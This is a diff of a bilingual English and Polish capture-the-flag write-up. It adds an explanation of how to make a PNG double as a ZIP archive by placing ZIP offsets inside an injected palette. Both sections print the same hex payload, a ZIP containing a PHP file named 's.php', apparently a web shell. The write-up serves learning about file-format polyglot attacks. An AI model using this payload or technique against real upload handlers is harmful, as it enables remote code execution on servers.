@@ -74,7 +74,14 @@ def edit_file(imagekey, palette_payload):
     print(" ".join("{:02x}".format(ord(c)) for c in png.content))
 ```
 
-We execute this with our crafted zip payload:
+Now we need to somehow make this png a proper ZIP file.
+The interesting thing about ZIP files is that, unlike most file formats, the header of the file is somewhere at the end.
+So the unzip is looking from the end of the file for the main header.
+We can also mark anything after this header as "comment" and then unzip will ignore it.
+Additionally the ZIP header specifies offsets (from the file start) at which the compressed data are stored.
+Since we know the "prefix" of the png file we can simply calculate the ZIP offsets by hand to start in the injected palette.
+
+We execute the code with our crafted zip payload:
 
 `payload_raw = "504B0304140000000800EE769148F0D042901D0000002100000005000000732E706870B3B12FC82850508977770D89564F548FD5803293D46335ADEDED78B900504B01021400140000000800EE769148F0D042901D00000021000000050000000000000001002000000029000000732E706870504B0506000000000100010033000000690000000000"`
 
@@ -173,7 +180,14 @@ def edit_file(imagekey, palette_payload):
     print(" ".join("{:02x}".format(ord(c)) for c in png.content))
 ```
 
-Wykonujemy ten skrypt z przygotowanym payloadem zip:
+Teraz potrzebujemy sprawić żeby plik png był też plikiem ZIP.
+Interesujący fakt na temat plików ZIP jest taki, że w przeciwieństwie do większości formatów, nagłówek pliku jest gdzieś pod koniec.
+Więc unzip szuka od końca pliku w poszukiwaniu głównego nagłówka.
+Dodatkowo możemy oznaczyć wszystko za nagłowkiem jako "komentarz" i unzip to zignoruje.
+Co więcej nagłówek ZIP specyfikuje offsetu (od początku pliku) gdzie znajdują się skompresowane dane.
+Ponieważ znamy "prefix" pliku png możemy ręcznie policzyć offsety w pliku ZIP tak żeby zaczynały się we wstrzykiwanej palecie kolorów.
+
+Wykonujemy skrypt z przygotowanym payloadem zip:
 
 `payload_raw = "504B0304140000000800EE769148F0D042901D0000002100000005000000732E706870B3B12FC82850508977770D89564F548FD5803293D46335ADEDED78B900504B01021400140000000800EE769148F0D042901D00000021000000050000000000000001002000000029000000732E706870504B0506000000000100010033000000690000000000"`
 
